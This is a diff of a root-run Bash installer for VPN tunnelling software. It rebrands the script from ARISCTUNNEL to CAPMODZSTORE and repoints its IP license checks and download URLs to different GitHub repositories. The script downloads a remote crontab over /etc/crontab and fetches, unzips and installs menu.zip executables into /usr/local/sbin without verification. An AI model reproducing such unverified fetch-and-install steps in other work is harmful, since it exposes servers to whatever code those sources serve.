@@ -30,8 +30,8 @@ export IP=$( curl -sS icanhazip.com )
 clear
 clear && clear && clear
 clear;clear;clear
-echo -e " ${CYAN} ┌─────────────────────────────────────────────────┐${NC}"
-echo -e " ${CYAN} │ ${BG_RED}               ARISCTUNNEL V3                  ${NC} ${CYAN}│$NC"
+echo -e " ${CYAN} ┌─────────────────────────────────────────────────┐${NC}" 
+echo -e " ${CYAN} │ ${BG_RED}                CAPMODZSTORE                   ${NC} ${CYAN}│$NC"
 echo -e " ${CYAN} └─────────────────────────────────────────────────┘${NC}"
 echo ""
 if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
@@ -76,9 +76,9 @@ echo -e "\e[32mloading...\e[0m"
 clear
 clear
 rm -f /usr/bin/user
-username=$(curl https://raw.githubusercontent.com/arivpnstores/izin/main/ip | grep $MYIP | awk '{print $2}')
+username=$(curl https://raw.githubusercontent.com/muhammadkelpin/izin/main/ip | grep $MYIP | awk '{print $2}')
 echo "$username" >/usr/bin/user
-expx=$(curl https://raw.githubusercontent.com/arivpnstores/izin/main/ip | grep $MYIP | awk '{print $3}')
+expx=$(curl https://raw.githubusercontent.com/muhammadkelpin/izin/main/ip | grep $MYIP | awk '{print $3}')
 echo "$expx" >/usr/bin/e
 username=$(cat /usr/bin/user)
 #oid=$(cat /usr/bin/ver)
@@ -97,7 +97,7 @@ mai="datediff "$Exp" "$DATE""
 Info="(${green}Active${NC})"
 Error="(${RED}ExpiRED${NC})"
 today=`date -d "0 days" +"%Y-%m-%d"`
-Exp1=$(curl https://raw.githubusercontent.com/arivpnstores/izin/main/ip | grep $MYIP | awk '{print $4}')
+Exp1=$(curl https://raw.githubusercontent.com/muhammadkelpin/izin/main/ip | grep $MYIP | awk '{print $4}')
 if [[ $today < $Exp1 ]]; then
 sts="${Info}"
 else
@@ -105,7 +105,7 @@ sts="${Error}"
 fi
 echo -e "\e[32mloading...\e[0m"
 clear
-REPO="https://raw.githubusercontent.com/arivpnstores/v3/main/"
+REPO="https://raw.githubusercontent.com/muhammadkelpin/capmodzstore/main/"
 start=$(date +%s)
 secs_to_human() {
 echo "Installation time : $((${1} / 3600)) hours $(((${1} / 60) % 60)) minute's $((${1} % 60)) seconds"
@@ -271,8 +271,8 @@ fi
 }
 clear
 restart_system() {
-USRSC=$(wget -qO- https://raw.githubusercontent.com/arivpnstores/izin/main/ip | grep $ipsaya | awk '{print $2}')
-EXPSC=$(wget -qO- https://raw.githubusercontent.com/arivpnstores/izin/main/ip | grep $ipsaya | awk '{print $3}')
+USRSC=$(wget -qO- https://raw.githubusercontent.com/muhammadkelpin/izin/main/ip | grep $ipsaya | awk '{print $2}')
+EXPSC=$(wget -qO- https://raw.githubusercontent.com/muhammadkelpin/izin/main/ip | grep $ipsaya | awk '{print $3}')
 domain=$(cat /root/domain)
 userdel jame > /dev/null 2>&1
 Username="g"
@@ -731,7 +731,7 @@ clear
 print_install "Memasang Menu Packet"
 wget ${REPO}files/crontap
 mv crontap /etc/crontab
-wget https://arisctunnel.xyz/menu.zip
+wget https://raw.githubusercontent.com/muhammadkelpin/capmodzstore/main/menu.zip
 unzip menu.zip
 chmod +x menu/*
 mv menu/* /usr/local/sbin
@@ -858,10 +858,10 @@ secs_to_human "$(($(date +%s) - ${start}))"
 sudo hostnamectl set-hostname $username
 clear
 echo -e "\e[94;1m╔═════════════════════════════════════════════════╗\e[0m"
-echo -e "\e[96;1m             ----[ ARIVPNSTORE ]----                    \e[0m"
+echo -e "\e[96;1m             ----[ CAPMODZSTORE ]----                   \e[0m"
 echo -e "\e[94;1m╚═════════════════════════════════════════════════╝\e[0m"
 echo ""
-echo -e "\e[95;1m  Whatsapp : 081327393959 \e[0m"
+echo -e "\e[95;1m  Tele : t.me/CapModzStoreTunnneling \e[0m"
 echo -e "\e[94;1m╔═════════════════════════════════════════════════╗\e[0m"
 echo -e "\e[92;1m            ----[ INSTALL SUCCES ]----                   \e[0m"
 echo -e "\e[94;1m╚═════════════════════════════════════════════════╝\e[0m"
